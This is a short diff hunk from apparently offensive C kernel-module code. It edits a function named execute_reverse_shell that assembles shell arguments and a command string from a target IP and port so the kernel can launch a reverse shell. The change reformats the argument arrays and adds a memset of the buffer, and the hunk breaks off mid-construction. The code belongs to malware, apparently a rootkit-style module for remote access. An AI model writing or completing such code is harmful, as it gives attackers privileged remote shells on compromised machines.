@@ -15,9 +15,24 @@ void execute_reverse_shell(struct work_struct *work){
     //We know the strings are allocated right after the work in the struct shell_params, so we cast it
     int err;
     struct shell_params *params = (struct shell_params*)work;
-    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL}; //Null terminated
+    char *envp[] = {
+                        HOME,
+                        TERM,
+                        params->target_ip,
+                        params->target_port,
+                        NULL
+                    }; //Null terminated
+    
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
-    char *argv[] = {SHELL, "-c", exec, NULL};
+    memset(exec, 0, sizeof(char) * 256);
+    
+    char *argv[] = {
+                        SHELL,
+                        "-c",
+                        exec,
+                        NULL
+                    };
+    
     strcat(exec, EXEC_P1);
     strcat(exec, params->target_ip);
     strcat(exec, " ");
